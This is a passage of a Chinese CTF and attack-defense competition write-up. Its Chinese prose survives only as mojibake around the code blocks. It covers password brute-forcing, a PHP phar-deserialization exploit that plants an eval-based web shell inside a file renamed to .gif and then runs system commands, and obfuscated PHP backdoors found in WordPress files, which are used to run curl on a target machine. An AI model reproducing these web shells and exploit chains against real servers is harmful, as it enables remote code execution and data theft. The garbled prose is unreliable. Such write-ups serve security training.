class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> ((b % <span class="number">65521</span>) &lt;&lt; <span class="number">16</span>) | (a % <span class="number">65521</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">—Ö</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span>(—Ö!=<span class="string">"0x0201"</span>&amp;&amp;adler32(—Ö)==adler32(<span class="string">"0x0201"</span>))&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">open_safe</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  keyhole.disabled = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">  password = <span class="regexp">/^password&#123;([0-9a-zA-Z_@!?-]+)&#125;$/</span>.exec(keyhole.value);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span> (!password || !check(password[<span class="number">1</span>])) <span class="keyword">return</span> <span class="built_in">document</span>.body.className = <span class="string">'denied'</span>;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.className = <span class="string">'granted'</span>;</span></span><br><span class="line"><span class="javascript">  content.value = <span class="string">"\x00\x00\x00\x00\x00\x83\x00\x00\x00N\x00\x01\x00\x01\x00\x00\x00\x00\x06\x05KP\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\x8d\x03\x00\x05TUtxt.galf\x00\x00\x00\x00\x81\xa4\x00\x00\x00\x01\x00\x00\x00\x00\x00\x18\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x03\x1e\x02\x01KP\x00\x00\x00%\x00\x00\x001=\x16\x04\x0c\x08\x07KP\x045R\tM\xc2\xde\x14sg\x92\xd0K\xbfh\x9c\x08\xeb\xf3@\x9d\x00\x14\x8b^\xfb\xa5\x96O\xc0\xdd\x8a(\xe6\x0c\x92\x1e \xad\x86\xa6@\xbc@J=\x11Z\xfe\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\xfb[\xd1\x9e\x8d\x03\x00\tTUtxt.galf\x00\x1c\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x04\x03KP"</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"keyhole"</span> <span class="attr">autofocus</span> <span class="attr">onchange</span>=<span class="string">"open_safe()"</span> <span class="attr">placeholder</span>=<span class="string">"üîë"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"result"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h4><p>ÊòæÁÑ∂ÂØÜÁ†ÅÊ≠£Á°ÆÂêéËæìÂá∫ÁöÑconten.valueÊòØ‰∏Ä‰∏™ÂéãÁº©ÂåÖÂèçËΩ¨ÂêéÁöÑÂÜÖÂÆπÔºåÊèêÂèñÂæóÂà∞ÂéãÁº©ÂåÖÂèëÁé∞Âä†ÂØÜÔºåÁåúÊµãÂØÜÁ†ÅË¶ÅËÉΩËµ∞ÈÄöJSÈÄªËæë„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"\x00\x00\x00\x00\x00\x83\x00\x00\x00N\x00\x01\x00\x01\x00\x00\x00\x00\x06\x05KP\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\x8d\x03\x00\x05TUtxt.galf\x00\x00\x00\x00\x81\xa4\x00\x00\x00\x01\x00\x00\x00\x00\x00\x18\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x03\x1e\x02\x01KP\x00\x00\x00%\x00\x00\x001=\x16\x04\x0c\x08\x07KP\x045R\tM\xc2\xde\x14sg\x92\xd0K\xbfh\x9c\x08\xeb\xf3@\x9d\x00\x14\x8b^\xfb\xa5\x96O\xc0\xdd\x8a(\xe6\x0c\x92\x1e \xad\x86\xa6@\xbc@J=\x11Z\xfe\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\xfb[\xd1\x9e\x8d\x03\x00\tTUtxt.galf\x00\x1c\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x04\x03KP"</span></span><br><span class="line">f=open(<span class="string">'extract.zip'</span>,<span class="string">'wb'</span>).write(s[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure><p>‰ΩøÁî®JavaScriptÁàÜÁ†¥ÂØÜÁ†ÅÔºö</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dec2hexString</span>(<span class="params">dec</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + (dec+<span class="number">0x10000</span>).toString(<span class="number">16</span>).substr(<span class="number">-4</span>).toUpperCase();</span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bruteforce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;<span class="number">0xffff</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(check(dec2hexString(i)))<span class="built_in">console</span>.log(<span class="string">"password&#123;"</span>+dec2hexString(i)+<span class="string">"&#125;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">bruteforce()</span><br><span class="line"><span class="comment">// password&#123;0x0120&#125; ‚àö</span></span><br><span class="line"><span class="comment">// password&#123;0x1011&#125; √ó</span></span><br></pre></td></tr></table></figure><p>ÊàñËÄÖ‰ΩøÁî®pythonÁàÜÁ†¥Ôºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /^password&#123;([0-9a-zA-Z_@!?-]+)&#125;$/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">adler32</span><span class="params">(s)</span>:</span></span><br><span class="line">    i=<span class="number">0</span>;a=<span class="number">1</span>;b=<span class="number">0</span>;M=<span class="number">0</span>;c=<span class="number">0</span>;d=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;len(s):</span><br><span class="line">        M=min(len(s)-i,<span class="number">3850</span>)</span><br><span class="line">        <span class="keyword">while</span> M&gt;<span class="number">0</span>:</span><br><span class="line">            c=ord(s[i]);i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> c&lt; <span class="number">0x80</span>:</span><br><span class="line">                a+=c</span><br><span class="line">            <span class="keyword">elif</span> c&gt;<span class="number">0xd800</span> <span class="keyword">and</span> c &lt; <span class="number">0xe000</span>:</span><br><span class="line">                c= (c &amp; <span class="number">1023</span>) +<span class="number">64</span> ;d = s[i]&amp;<span class="number">1023</span>;i+=<span class="number">1</span></span><br><span class="line">                a+=<span class="number">240</span> | ((c &gt;&gt; <span class="number">8</span>) &amp; <span class="number">7</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((c &gt;&gt; <span class="number">2</span>) &amp; <span class="number">63</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((d &gt;&gt; <span class="number">6</span>) &amp; <span class="number">15</span>) | ((c &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | (d &amp; <span class="number">63</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a += <span class="number">224</span> | ((c &gt;&gt; <span class="number">12</span>) &amp; <span class="number">15</span>); b += a;M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((c &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>); b += a;M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | (c &amp; <span class="number">63</span>)</span><br><span class="line">            b+=a;M-=<span class="number">1</span></span><br><span class="line">        a = (<span class="number">15</span> * (a &gt;&gt; <span class="number">16</span>) + (a &amp; <span class="number">65535</span>))</span><br><span class="line">        b = (<span class="number">15</span> * (b &gt;&gt; <span class="number">16</span>) + (b &amp; <span class="number">65535</span>))</span><br><span class="line">    <span class="keyword">return</span> ((b % <span class="number">65521</span>) &lt;&lt; <span class="number">16</span>) | (a % <span class="number">65521</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="string">'0123456789'</span>,repeat=<span class="number">4</span>):</span><br><span class="line">    p=<span class="string">'0x'</span>+<span class="string">''</span>.join(i)</span><br><span class="line">    <span class="keyword">if</span> adler32(p)==adler32(<span class="string">'0x0201'</span>):</span><br><span class="line">        <span class="keyword">print</span> p,</span><br><span class="line">        <span class="comment"># [0x0120] 0x0201 0x1011</span></span><br></pre></td></tr></table></figure><p>ÂØÜÁ†Å‰∏∫<code>password{0x0120}</code> ÔºåËß£ÂéãÂæóÂà∞flag„ÄÇ<code>flag{cjvf33_98hfi3_jfh3_dsh93h_f3had}</code> „ÄÇ</p><h3 id="MISC3"><a href="#MISC3" class="headerlink" title="MISC3"></a>MISC3</h3><p>Áªô‰∫Ü1321‰∏™TXTÔºåÊØè‰∏™Êñá‰ª∂‰∏Ä‰∏™Â≠óÁ¨¶ÔºåÂÜÖÂÆπÂ¶Ç‰∏ã„ÄÇÊèêÁ§∫Êó∂Èó¥Êà≥ÔºåÊ≤°ÊêûÊáÇË¶ÅÂπ≤Âï•„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat ./*</span><br><span class="line">Money is not evil by itself.Its just paper with perceived value to obtain other things we value <span class="keyword">in</span> other ways.If not money - what is. evil you may ask?Evil is the unquenchable, obsessive and moral bending desire <span class="keyword">for</span> more.Evil is the bottomless, soulless and obsessive-compulsive pursuit of some pot of gold.at the end of some rainbow <span class="built_in">which</span> doesn<span class="string">'t exist.Evil is having a price tag for your heart and soul in exchange for financial success at any cost.Evil is trying to buy happiness, again and again.until all of those fake, short lived mirages of emotions are gone.Make more time.I'</span>m not saying you can<span class="string">'t be financially successful.I'</span>m saying have a greater purpose <span class="keyword">in</span> life well beyond the pursuit of financial success.Your soul is screaming <span class="keyword">for</span> you to answer your <span class="literal">true</span> calling.You can change today <span class="keyword">if</span> you redefine what success is to you.You can transform your damaged relationships and build new ones.You can forgive yourself and others who<span class="string">'ve hurt you.You can become a leader by mentoring with others who you aspire to be like.You can re-balance your priorities in life.You can heal your marriage and recreate a stronger love than you ever thought possible.You can become the best parent possible at any age - even 86.but don'</span>t <span class="built_in">wait</span> until then...You will always be able to make more money.But you cannot make more time.</span><br></pre></td></tr></table></figure><p>ËÆ∞ÂΩï‰∏Ä‰∏™Ëé∑ÂèñÊñá‰ª∂Êó∂Èó¥ÁöÑÊñπÂºè„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">a=subprocess.check_output((<span class="string">"stat"</span>,<span class="string">"-c"</span>, <span class="string">"%y"</span>, file_name))</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>‰∏áËÉΩÂØÜÁ†Å</p><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>‰∏ªÈ°µCTRL+UÔºåÂèëÁé∞Ê∫êÁ†ÅÊ≥ÑÈú≤„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://172.16.17.2/file_aq12ws.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "hahaha";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊòØÂâçÊÆµÊó∂Èó¥black hat‰∏äÊèêÂà∞ÁöÑÂà©Áî®phar‰º™ÂçèËÆÆÂú®‰∏Ä‰∫õÊñá‰ª∂Á≥ªÁªüÂáΩÊï∞‰∏≠Ëß¶ÂèëÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ</p><p>pharÊñá‰ª∂Êú¨Ë¥®‰∏äÊòØ‰∏Ä‰∏™ÂéãÁº©Êñá‰ª∂ÔºåÂú®manifestÈÉ®ÂàÜÂ≠òÊîæÊØè‰∏™Ë¢´ÂéãÁº©Êñá‰ª∂ÁöÑÊùÉÈôê„ÄÅÂ±ûÊÄßÁ≠â‰ø°ÊÅØÂíåÁî®Êà∑Ëá™ÂÆö‰πâÁöÑmeta-dataÊï∞ÊçÆÔºåÂêéËÄÖÊòØ‰ª•Â∫èÂàóÂåñÂêéÁöÑÂΩ¢ÂºèÂ≠òÂú®ÁöÑ„ÄÇËÄåPHP‰∏≠Â§ßÈÉ®ÂàÜÊñá‰ª∂Á≥ªÁªüÂáΩÊï∞Âú®ÈÄöËøá <code>phar://</code> ‰º™ÂçèËÆÆËß£ÊûêpharÊñá‰ª∂Êó∂ÔºåÈÉΩ‰ºöÂ∞Ümeta-dataÂèçÂ∫èÂàóÂåñ„ÄÇÂõ†Ê≠§Â∞±Êúâ‰∫ÜÊú¨È¢òÁöÑÂèçÂ∫èÂàóÂåñËß¶ÂèëÁÇπfile_existsÂáΩÊï∞„ÄÇÈô§‰∫Üfile_existsËøòÊúâ‰∏ãÂõæÊâÄÁ§∫ÁöÑÂáΩÊï∞ÔºåËØ¶ËßÅ <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">Âà©Áî® phar ÊãìÂ±ï php ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊîªÂáªÈù¢</a> „ÄÇ</p><p><img src="17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt="img"></p><p>ÊâÄ‰ª•Êú¨È¢òÁöÑÊÄùË∑ØÊòØÂÖàÁîüÊàê‰∏Ä‰∏™meta-data‰∏≠ÂåÖÂê´ÊÅ∂ÊÑèobjectÁöÑpharÊñá‰ª∂ÔºåÁÑ∂ÂêéÈÄöËøá‰∏ä‰º†ÁÇπ‰∏ä‰º†ËØ•Êñá‰ª∂ÂæóÂà∞Ë∑ØÂæÑÔºåÂÜçÂú® <code>file_aq12ws.php</code> ÈÄöËøáfilenameÂèÇÊï∞‰ª•<code>phar://</code> ÊñπÂºèÂåÖÂê´ËØ•Êñá‰ª∂ÔºåÂ∞±Â∞ÜÂú®file_existsÂáΩÊï∞Â§ÑËß¶ÂèëpharÊñá‰ª∂ÁöÑmeta-dataÁöÑÂèçÂ∫èÂàóÂåñÔºåÂ∞±ÂèØ‰ª•ÂæóÂà∞‰∏Ä‰∏™web shell„ÄÇ</p><p>Ë¶ÅÁîüÊàêpharÊñá‰ª∂ÔºåÈúÄË¶Å phar.readonly ‰∏∫OffÔºåÂç≥ÂÄº‰∏∫0„ÄÇËÄåÂá∫‰∫éÂÆâÂÖ®ÊÄßËÄÉËôëÔºåËØ•È°πÈªòËÆ§‰ΩøËÉΩÔºåÂÄº‰∏∫1„ÄÇÂΩìphp.iniÊñá‰ª∂‰∏≠ÁöÑphar.readonlyÂÄº‰∏∫0Êó∂ÔºåÂèØ‰ª•‰ΩøÁî®ini_setÂú®ËÑöÊú¨‰∏≠ËÆæ‰∏∫1Êàñ0ÔºõÂΩìÂÄº‰∏∫1Êó∂ÔºåÂè™ËÉΩÈÄöËøá‰øÆÊîπphp.iniÊñá‰ª∂Êù•‰øÆÊîπÂÄºËÄå‰∏çËÉΩÈÄöËøáËÑöÊú¨‰øÆÊîπ„ÄÇ‰πüÂ∞±ÊòØËØ¥ÔºåÊàë‰ª¨ÈúÄË¶ÅÂú®ÁîüÊàêpharÊñá‰ª∂Ââç‰øÆÊîπphp.ini‰∏≠phar.readonlyÂÄºÁöÑOff„ÄÇËØ¶ÁªÜËØ¥ÊòéËßÅ <a href="http://php.net/manual/en/phar.configuration.php#ini.phar.readonly" target="_blank" rel="noopener">ÊñáÊ°£</a> „ÄÇ</p><p>ÁîüÊàêpharÂåÖÁöÑ‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'@eval($_GET["cmd"]);'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $evil_object=<span class="keyword">new</span> MyClass();<span class="comment">//ÁîüÊàêÊÅ∂ÊÑèÂØπË±°</span></span><br><span class="line"></span><br><span class="line">    $file_name=<span class="string">"test.phar"</span>;<span class="comment">//ÂêéÁºÄÂøÖÈ°ª‰∏∫phar</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists($file_name))unlink(<span class="string">'test.phar'</span>);<span class="comment">//Âà†Èô§ÂΩìÂâçÁõÆÂΩï‰∏ãÂ∑≤ÊúâÁöÑpharÂåÖ</span></span><br><span class="line">    $phar=<span class="keyword">new</span> Phar($file_name);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//ËÆæÁΩÆstubÔºåÂèØÁêÜËß£‰∏∫pharÊñá‰ª∂ÁöÑÊ†áÂøó</span></span><br><span class="line">    $phar-&gt;setMetadata($evil_object);<span class="comment">//Â∞ÜÊÅ∂ÊÑèÂØπË±°‰Ωú‰∏∫Ëá™ÂÆö‰πâÁöÑmeta-data‰º†ÂÖ•manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);<span class="comment">//Ê∑ªÂä†ÂéãÁº©Êñá‰ª∂ÂèäÂÖ∂ÂÜÖÂÆπ</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>ËÆøÈóÆËØ•‰ª£Á†ÅÂêéÁõÆÂΩï‰∏ã‰ºöÁîüÊàê<code>test.phar</code> Êñá‰ª∂ÔºåÈáçÂëΩÂêç‰∏∫<code>test.gif</code> Ôºå‰∏ä‰º†ÂêéËÆøÈóÆ <code>target.ip/file_aq12ws.php?filename=phar://test.gif&amp;cmd=phpinfo();</code> ËßÅÂà∞phpinfoÈ°µÈù¢Â∞±ËØ¥ÊòéÊàêÂäü‰∫Ü„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ xxd test.phar</span><br><span class="line">00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  &lt;?php __HALT_COM</span><br><span class="line">00000010: 5049 4c45 5228 293b 203f 3e0d 0a70 0000  PILER(); ?&gt;..p..</span><br><span class="line">00000020: 0001 0000 0011 0000 0001 0000 0000 003b  ...............;</span><br><span class="line">00000030: 0000 004f 3a37 3a22 4d79 436c 6173 7322  ...O:7:<span class="string">"MyClass"</span></span><br><span class="line">00000040: 3a31 3a7b 733a 363a 226f 7574 7075 7422  :1:&#123;s:6:<span class="string">"output"</span></span><br><span class="line">00000050: 3b73 3a32 303a 2240 6576 616c 2824 5f47  ;s:20:<span class="string">"@eval(<span class="variable">$_G</span></span></span><br><span class="line"><span class="string">00000060: 4554 5b22 636d 6422 5d29 3b22 3b7d 0700  ET["</span>cmd<span class="string">"]);"</span>;&#125;..</span><br><span class="line">00000070: 0000 666f 6f2e 7478 7403 0000 000a 5ffb  ..foo.txt....._.</span><br><span class="line">00000080: 5b03 0000 00aa 8cff 76b6 0100 0000 0000  [.......v.......</span><br><span class="line">00000090: 0062 6172 7533 2162 c819 a6d5 6019 ab22  .baru3!b....`..<span class="string">"</span></span><br><span class="line"><span class="string">000000a0: 7e2e f1df 96d7 b375 0200 0000 4742 4d42  ~......u....GBMB</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif&amp;a=system('find / | grep flag');</span></span><br><span class="line">http:<span class="comment">//172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif&amp;a=system('cat /var/www/html/sdf3r_df3erdf/flag.txt');</span></span><br><span class="line">flag&#123;qwe3_89fdsf3_jjnj3ioxc_ozxov&#125;</span><br></pre></td></tr></table></figure><h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><p><strong>attack</strong> </p><p>‰∏Ä‰∏äÊù•DÁõæÊâ´Âá∫Âá†‰∏™ÂêéÈó®„ÄÇÁî®ÂÖ∂‰∏≠‰∏Ä‰∏™Ëøû‰∫ÜËèúÂàÄÔºåÂú®<code>E:\wwwroot\RequestFlag\</code> ÂèëÁé∞<code>url.bat</code> ÔºåÂÜÖÂÆπ‰∏∫Ôºö<code>curl.exe https://FlagServer.com:9000/flag --cacert ca.crt --cert client.crt --key client.key</code> ÔºåÂú®ÁõÆÊ†áÊú∫‰∏äÊâßË°åËØ•ÂëΩ‰ª§ÂèØ‰ª•ÂæóÂà∞ÂØπÊñπflag„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://172.16.18.13/wordpress/wp-includes/customize/class-wp-customize-background-image-list.php"</span> -d <span class="string">"-7=system('E:\wwwroot\RequestFlag\curl.exe https://FlagServer.com:9000/flag --cacert E:\wwwroot\RequestFlag\ca.crt --cert E:\wwwroot\RequestFlag\client.crt --key E:\wwwroot\RequestFlag\client.key');"</span></span><br></pre></td></tr></table></figure><p>Áî®ÁöÑÊú®È©¨ÊòØ<code>wwwroot\wordpress\wp-includes\customize\class-wp-customize-background-image-list.php</code>  ÔºåÁõ∏ÂΩì‰∫é<code>@assert(${_POST}[-7]);</code> „ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_ = <span class="string">"s"</span> . <span class="string">"s"</span> . <span class="comment">/*-/*-*/</span><span class="string">"e"</span> . <span class="comment">/*-/*-*/</span><span class="string">"r"</span>;</span><br><span class="line">@$_ = <span class="comment">/*-/*-*/</span><span class="string">"a"</span> . <span class="comment">/*-/*-*/</span>$_ . <span class="comment">/*-/*-*/</span><span class="string">"t"</span>;</span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">"_P"</span> . <span class="comment">/*-/*-*/</span><span class="string">"OS"</span> . <span class="comment">/*-/*-*/</span><span class="string">"T"</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span> - <span class="comment">/*-/*-*/</span><span class="number">2</span><span class="comment">/*-/*-*/</span> - <span class="comment">/*-/*-*/</span><span class="number">5</span><span class="comment">/*-/*-*/</span>]);</span><br></pre></td></tr></table></figure><p>Âú®WAF‰∏äÈÖç‰∫Ü‰∏Ä‰∫õÊïèÊÑüÂ≠óÁ¨¶Ê≠£ÂàôÂêéËßÇÂØüÊó•ÂøóÔºåÂèëÁé∞Âè¶‰∏Ä‰∏™Â§ßÂÆ∂Áî®ÁöÑÊØîËæÉÂ§öÁöÑÂêéÈó®Ôºå<code>wwwroot\wordpress\wp-includes\pomo\tp.php</code> ÔºåÁ≠â‰ª∑‰∫é<code>@ASsERT(eval(@$_POST[cmd]));</code> „ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$&#123;(<span class="string">"#"</span> ^ <span class="string">"|"</span>) . (<span class="string">"#"</span> ^ <span class="string">"|"</span>)&#125; = (<span class="string">"!"</span> ^ <span class="string">"`"</span>) . (<span class="string">"( "</span> ^ <span class="string">"&#123;"</span>) . (<span class="string">"("</span> ^ <span class="string">"["</span>) . (<span class="string">"~"</span> ^ <span class="string">";"</span>) . (<span class="string">"|"</span> ^ <span class="string">"."</span>) . (<span class="string">"*"</span> ^ <span class="string">"~"</span>);</span><br><span class="line">@$&#123;(<span class="string">"#"</span> ^ <span class="string">"|"</span>) . (<span class="string">"#"</span> ^ <span 